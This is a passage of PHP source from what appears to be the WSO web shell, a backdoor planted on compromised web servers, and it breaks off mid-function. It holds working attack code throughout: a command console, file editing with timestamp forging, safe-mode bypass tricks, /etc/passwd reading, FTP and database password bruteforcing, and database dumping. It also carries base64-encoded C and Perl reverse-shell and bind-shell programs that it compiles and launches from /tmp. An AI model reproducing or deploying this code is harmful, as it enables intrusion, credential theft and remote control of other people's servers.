		echo 'File not exists';
		printFooter();
		return;
	}
	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
	$gid = @posix_getgrgid(@fileowner($_POST['p1']));
	echo '<span>Name:</span> '.htmlspecialchars($_POST['p1']).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
	else
		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo '<a href=# onclick="g(null,null,null,\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
	echo '<br><br>';
	switch($_POST['p2']) {
		case 'view':
			echo '<pre class=ml1>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</pre>';
			break;
		case 'highlight':
			if( is_readable($_POST['p1']) ) {
				echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
				$code = highlight_file($_POST['p1'],true);
				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				$perms = 0;
				for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
				if(!@chmod($_POST['p1'], $perms))
					echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
				else
					die('<script>g(null,null,null,null,"")</script>');
			}
			echo '<form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">>"></form>';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
				@file_put_contents($_POST['p1'],$_POST['p3']);
				echo 'Saved!<br><script>document.mf.p3.value="";</script>';
			}
			echo '<form onsubmit="g(null,null,null,null,this.text.value);return false;"><textarea name=text class=bigarea>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</textarea><input type=submit value=">>"></form>';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000<br>','','');
			$len = strlen($c);
			for ($i=0; $i<$len; ++$i) {
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
					$h[1] .= '<br>';
					$h[2] .= "\n";
				}
		 	}
			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
				if(!@rename($_POST['p1'], $_POST['p3']))
					echo 'Can\'t rename!<br><script>document.mf.p3.value="";</script>';
				else
					die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
			}
			echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value=">>"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
				$time = strtotime($_POST['p3']);
				if($time) {
					if(@touch($_POST['p1'],$time,$time))
						die('<script>g(null,null,null,null,"")</script>');
					else {
						echo 'Fail!<script>document.mf.p3.value="";</script>';
					}
				} else echo 'Bad time format!<script>document.mf.p3.value="";</script>';
			}
			echo '<form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
			break;
		case 'mkfile':
			
			break;
	}
	echo '</div>';
	printFooter();
}

function actionSafeMode() {
	$temp='';
	ob_start();
	switch($_POST['p1']) {
		case 1:
			$temp=@tempnam($test, 'cx');
			if(@copy("compress.zlib://".$_POST['p2'], $temp)){
				echo @file_get_contents($temp);
				unlink($temp);
			} else
				echo 'Sorry... Can\'t open file';
			break;
		case 2:
			$files = glob($_POST['p2'].'*');
			if( is_array($files) )
				foreach ($files as $filename)
					echo $filename."\n";
			break;
		case 3:
			$ch = curl_init("file://".$_POST['p2']."\x00".SELF_PATH);
			curl_exec($ch);
			break;
		case 4:
			ini_restore("safe_mode");
			ini_restore("open_basedir");
			include($_POST['p2']);
			break;
		case 5:
			for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
				$uid = @posix_getpwuid($_POST['p2']);
				if ($uid)
					echo join(':',$uid)."\n";
			}
			break;
		case 6:
			if(!function_exists('imap_open'))break;
			$stream = imap_open($_POST['p2'], "", "");
			if ($stream == FALSE)
				break;
			echo imap_body($stream, 1);
			imap_close($stream);
			break;
	}
	$temp = ob_get_clean();
	printHeader();
	echo '<h1>Safe mode bypass</h1><div class=content>';
	echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form><br><br><span>Imap_open (read file)</span><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form>';
	if($temp)
		echo '<pre class="ml1" style="margin-top:5px" id="Output">'.$temp.'</pre>';
	echo '</div>';
	printFooter();
}

function actionConsole() {
	if(isset($_POST['ajax'])) {
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
		ob_start();
		echo "document.cf.cmd.value='';\n";
		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\\'\0"));
		if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))	{
			if(@chdir($match[1])) {
				$GLOBALS['cwd'] = @getcwd();
				echo "document.mf.c.value='".$GLOBALS['cwd']."';";
			}
		}
		echo "document.cf.output.value+='".$temp."';";
		echo "document.cf.output.scrollTop = document.cf.output.scrollHeight;";
		$temp = ob_get_clean();
		echo strlen($temp), "\n", $temp;
		exit;
	}
	printHeader();
?>
<script>
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array("");
var cur = 0;
function kp(e) {
	var n = (window.Event) ? e.which : e.keyCode;
	if(n == 38) {
		cur--;
		if(cur>=0)
			document.cf.cmd.value = cmds[cur];
		else
			cur++;
	} else if(n == 40) {
		cur++;
		if(cur < cmds.length)
			document.cf.cmd.value = cmds[cur];
		else
			cur--;
	}
}
function add(cmd) {
	cmds.pop();
	cmds.push(cmd);
	cmds.push("");
	cur = cmds.length-1;
}
</script>
<?php
	echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(document.cf.cmd.value==\'clear\'){document.cf.output.value=\'\';document.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;"><select name=alias>';
	foreach($GLOBALS['aliases'] as $n => $v) {
		if($v == '') {
			echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
			continue;
		}
		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
	}
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
	echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value=">>"> <input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
	if(!empty($_POST['p1'])) {
		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
	}
	echo '</textarea><input type=text name=cmd style="border-top:0;width:100%;margin:0;" onkeydown="kp(event);">';
	echo '</form></div><script>document.cf.cmd.focus();</script>';
	printFooter();
}

function actionLogout() {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo 'bye!';
}

function actionSelfRemove() {
	printHeader();
	if($_POST['p1'] == 'yes') {
		if(@unlink(SELF_PATH))
			die('Shell has been removed');
		else
			echo 'unlink error!';
	}
	echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
	printFooter();
}

function actionBruteforce() {
	printHeader();
	if( isset($_POST['proto']) ) {
		echo '<h1>Results</h1><div class=content><span>Type:</span> '.htmlspecialchars($_POST['proto']).' <span>Server:</span> '.htmlspecialchars($_POST['server']).'<br>';
		if( $_POST['proto'] == 'ftp' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$fp = @ftp_connect($ip, $port?$port:21);
				if(!$fp) return false;
				$res = @ftp_login($fp, $login, $pass);
				@ftp_close($fp);
				return $res;
			}
		} elseif( $_POST['proto'] == 'mysql' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$res = @mysql_connect($ip.':'.$port?$port:3306, $login, $pass);
				@mysql_close($res);
				return $res;
			}
		} elseif( $_POST['proto'] == 'pgsql' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=''";
				$res = @pg_connect($server[0].':'.$server[1]?$server[1]:5432, $login, $pass);
				@pg_close($res);
				return $res;
			}
		}
		$success = 0;
		$attempts = 0;
		$server = explode(":", $_POST['server']);
		if($_POST['type'] == 1) {
			$temp = @file('/etc/passwd');
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = explode(":", $line);
					++$attempts;
					if( bruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) {
						$success++;
						echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($line[0]).'<br>';
					}
					if(@$_POST['reverse']) {
						$tmp = "";
						for($i=strlen($line[0])-1; $i>=0; --$i)
							$tmp .= $line[0][$i];
						++$attempts;
						if( bruteForce(@$server[0],@$server[1], $line[0], $tmp) ) {
							$success++;
							echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($tmp);
						}
					}
				}
		} elseif($_POST['type'] == 2) {
			$temp = @file($_POST['dict']);
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = trim($line);
					++$attempts;
					if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {
						$success++;
						echo '<b>'.htmlspecialchars($_POST['login']).'</b>:'.htmlspecialchars($line).'<br>';
					}
				}
		}
		echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";
	}
	echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>'
		.'<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>'
		.'<input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">'
		.'<input type=hidden name=a value="'.htmlspecialchars($_POST['a']).'">'
		.'<input type=hidden name=charset value="'.htmlspecialchars($_POST['charset']).'">'
		.'<span>Server:port</span></td>'
		.'<td><input type=text name=server value="127.0.0.1"></td></tr>'
		.'<tr><td><span>Brute type</span></td>'
		.'<td><label><input type=radio name=type value="1" checked> /etc/passwd</label></td></tr>'
		.'<tr><td></td><td><label style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>'
		.'<tr><td></td><td><label><input type=radio name=type value="2"> Dictionary</label></td></tr>'
		.'<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>'
		.'<td><input type=text name=login value="komsen"></td></tr>'
		.'<tr><td><span>Dictionary</span></td>'
		.'<td><input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"></td></tr></table>'
		.'</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr></form></table>';
	echo '</div><br>';
	printFooter();
}

function actionSql() {
	class DbClass {
		var $type;
		var $link;
		var $res;
		function DbClass($type)	{
			$this->type = $type;
		}
		function connect($host, $user, $pass, $dbname){
			switch($this->type)	{
				case 'mysql':
					if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true;
					break;
				case 'pgsql':
					$host = explode(':', $host);
					if(!$host[1]) $host[1]=5432;
					if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
					break;
			}
			return false;
		}
		function selectdb($db) {
			switch($this->type)	{
				case 'mysql':
					if (@mysql_select_db($db))return true;
					break;
			}
			return false;
		}
		function query($str) {
			switch($this->type) {
				case 'mysql':
					return $this->res = @mysql_query($str);
					break;
				case 'pgsql':
					return $this->res = @pg_query($this->link,$str);
					break;
			}
			return false;
		}
		function fetch() {
			$res = func_num_args()?func_get_arg(0):$this->res;
			switch($this->type)	{
				case 'mysql':
					return @mysql_fetch_assoc($res);
					break;
				case 'pgsql':
					return @pg_fetch_assoc($res);
					break;
			}
			return false;
		}
		function listDbs() {
			switch($this->type)	{
				case 'mysql':
					return $this->res = @mysql_list_dbs($this->link);
				break;
				case 'pgsql':
					return $this->res = $this->query("SELECT datname FROM pg_database");
				break;
			}
			return false;
		}
		function listTables() {
			switch($this->type)	{
				case 'mysql':
					return $this->res = $this->query('SHOW TABLES');
				break;
				case 'pgsql':
					return $this->res = $this->query("select table_name from information_schema.tables where (table_schema != 'information_schema' AND table_schema != 'pg_catalog') or table_name = 'pg_user'");
				break;
			}
			return false;
		}
		function error() {
			switch($this->type)	{
				case 'mysql':
					return @mysql_error($this->link);
				break;
				case 'pgsql':
					return @pg_last_error($this->link);
				break;
			}
			return false;
		}
		function setCharset($str) {
			switch($this->type)	{
				case 'mysql':
					if(function_exists('mysql_set_charset'))
						return @mysql_set_charset($str, $this->link);
					else
						$this->query('SET CHARSET '.$str);
					break;
				case 'mysql':
					return @pg_set_client_encoding($this->link, $str);
					break;
			}
			return false;
		}
		function dump($table) {
			switch($this->type)	{
				case 'mysql':
					$res = $this->query('SHOW CREATE TABLE `'.$table.'`');
					$create = mysql_fetch_array($res);
					echo $create[1].";\n\n";
					$this->query('SELECT * FROM `'.$table.'`');
					while($item = $this->fetch()) {
						$columns = array();
						foreach($item as $k=>$v) {
							$item[$k] = "'".@mysql_real_escape_string($v)."'";
							$columns[] = "`".$k."`";
						}
					echo 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
					}
				break;
				case 'pgsql':
					$this->query('SELECT * FROM '.$table);
					while($item = $this->fetch()) {
						$columns = array();
						foreach($item as $k=>$v) {
							$item[$k] = "'".addslashes($v)."'";
							$columns[] = $k;
						}
					echo 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
					}
				break;
			}
			return false;
		}
	};
	$db = new DbClass($_POST['type']);
	if(@$_POST['p2']=='download') {
		ob_start("ob_gzhandler", 4096);
		$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
		$db->selectdb($_POST['sql_base']);
		header("Content-Disposition: attachment; filename=dump.sql");
		header("Content-Type: text/plain");
		foreach($_POST['tbl'] as $v)
				$db->dump($v);
		exit;
	}
	printHeader();
	?>
	<h1>Sql browser</h1><div class=content>
	<form name="sf" method="post">
		<table cellpadding="2" cellspacing="0">
			<tr>
				<td>Type</td>
				<td>Host</td>
				<td>Login</td>
				<td>Password</td>
				<td>Database</td>
				<td></td>
			</tr>
			<tr>
				<input type=hidden name=a value=Sql>
				<input type=hidden name=p1 value='query'>
				<input type=hidden name=p2>
				<input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd']);?>'>
				<input type=hidden name=charset value='<?=isset($_POST['charset'])?$_POST['charset']:''?>'>
				<td>
					<select name='type'>
						<option value="mysql" <?php if(@$_POST['type']=='mysql')echo 'selected';?>>MySql</option>
						<option value="pgsql" <?php if(@$_POST['type']=='pgsql')echo 'selected';?>>PostgreSql</option>
					</select></td>
				<td><input type=text name=sql_host value='<?=(empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host']));?>'></td>
				<td><input type=text name=sql_login value='<?=(empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login']));?>'></td>
				<td><input type=text name=sql_pass value='<?=(empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass']));?>'></td>
				<td>
	<?php
	$tmp = "<input type=text name=sql_base value=''>";
	if(isset($_POST['sql_host'])){
		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
			switch($_POST['charset']) {
				case "Windows-1251": $db->setCharset('cp1251'); break;
				case "UTF-8": $db->setCharset('utf8'); break;
				case "KOI8-R": $db->setCharset('koi8r'); break;
				case "KOI8-U": $db->setCharset('koi8u'); break;
				case "cp866": $db->setCharset('cp866'); break;
			}
			$db->listDbs();
			echo "<select name=sql_base><option value=''></option>";
			while($item = $db->fetch()) {
				list($key, $value) = each($item);
				echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
			}
			echo '</select>';
		}
		else echo $tmp;
	}else
		echo $tmp;
	?></td>
				<td><input type=submit value=">>"></td>
			</tr>
		</table>
		<script>
			function st(t,l) {
				document.sf.p1.value = 'select';
				document.sf.p2.value = t;
				if(l!=null)document.sf.p3.value = l;
				document.sf.submit();
			}
			function is() {
				for(i=0;i<document.sf.elements['tbl[]'].length;++i)
					document.sf.elements['tbl[]'][i].checked = !document.sf.elements['tbl[]'][i].checked;
			}
		</script>
	<?php
	if(isset($db) && $db->link){
		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
			if(!empty($_POST['sql_base'])){
				$db->selectdb($_POST['sql_base']);
				echo "<tr><td width=1 style='border-top:2px solid #666;border-right:2px solid #666;'><span>Tables:</span><br><br>";
				$tbls_res = $db->listTables();
				while($item = $db->fetch($tbls_res)) {
					list($key, $value) = each($item);
					$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.''));
					$value = htmlspecialchars($value);
					echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."')\">".$value."</a> (".$n['n'].")</nobr><br>";
				}
				echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'></td><td style='border-top:2px solid #666;'>";
				if(@$_POST['p1'] == 'select') {
					$_POST['p1'] = 'query';
					$db->query('SELECT COUNT(*) as n FROM '.$_POST['p2'].'');
					$num = $db->fetch();
					$num = $num['n'];
					echo "<span>".$_POST['p2']."</span> ($num) ";
					for($i=0;$i<($num/30);$i++)
						if($i != (int)$_POST['p3'])
							echo "<a href='#' onclick='st(\"".$_POST['p2']."\", $i)'>",($i+1),"</a> ";
						else
							echo ($i+1)," ";
					if($_POST['type']=='pgsql')
						$_POST['p3'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);
					else
						$_POST['p3'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';
					echo "<br><br>";
				}
				if((@$_POST['p1'] == 'query') && !empty($_POST['p3'])) {
					$db->query(@$_POST['p3']);
					if($db->res !== false) {
						$title = false;
						echo '<table width=100% cellspacing=0 cellpadding=2 class=main>';
						$line = 1;
						while($item = $db->fetch())	{
							if(!$title)	{
								echo '<tr>';
								foreach($item as $key => $value)
									echo '<th>'.$key.'</th>';
								reset($item);
								$title=true;
								echo '</tr><tr>';
								$line = 2;
							}
							echo '<tr class="l'.$line.'">';
							$line = $line==1?2:1;
							foreach($item as $key => $value) {
								if($value == null)
									echo '<td><i>null</i></td>';
								else
									echo '<td>'.nl2br(htmlspecialchars($value)).'</td>';
							}
							echo '</tr>';
						}
						echo '</table>';
					} else {
						echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
					}
				}
				echo "<br><textarea name='p3' style='width:100%;height:100px'>".@htmlspecialchars($_POST['p3'])."</textarea><br/><input type=submit value='Execute'>";
				echo "</td></tr>";
			}
			echo "</table></form><br/><form onsubmit='document.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
			if(@$_POST['p1'] == 'loadfile') {
				$db->query("SELECT LOAD_FILE('".addslashes($_POST['p2'])."') as file");
				$file = $db->fetch();
				echo '<pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
			}
	}
	echo '</div>';
	printFooter();
}
function actionNetwork() {
	printHeader();
	$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	$bind_port_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	?>
	<h1>Network tools</h1><div class=content>
	<form name='nfp' onSubmit="g(null,null,this.using.value,this.port.value,this.pass.value);return false;">
	<span>Bind port to /bin/sh</span><br/>
	Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass' value='wso'> Using: <select name="using"><option value='bpc'>C</option><option value='bpp'>Perl</option></select> <input type=submit value=">>">
	</form>
	<form name='nfp' onSubmit="g(null,null,this.using.value,this.server.value,this.port.value);return false;">
	<span>Back-connect to</span><br/>
	Server: <input type='text' name='server' value='<?=$_SERVER['REMOTE_ADDR']?>'> Port: <input type='text' name='port' value='31337'> Using: <select name="using"><option value='bcc'>C</option><option value='bcp'>Perl</option></select> <input type=submit value=">>">
	</form><br>
	<?php
	if(isset($_POST['p1'])) {
		function cf($f,$t) {
			$w=@fopen($f,"w") or @function_exists('file_put_contents');
			if($w)	{
				@fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t));
				@fclose($w);
			}
		}
		if($_POST['p1'] == 'bpc') {
			cf("/tmp/bp.c",$bind_port_c);
			$out = ex("gcc -o /tmp/bp /tmp/bp.c");
			@unlink("/tmp/bp.c");
			$out .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$out\n".ex("ps aux | grep bp")."</pre>";
		}
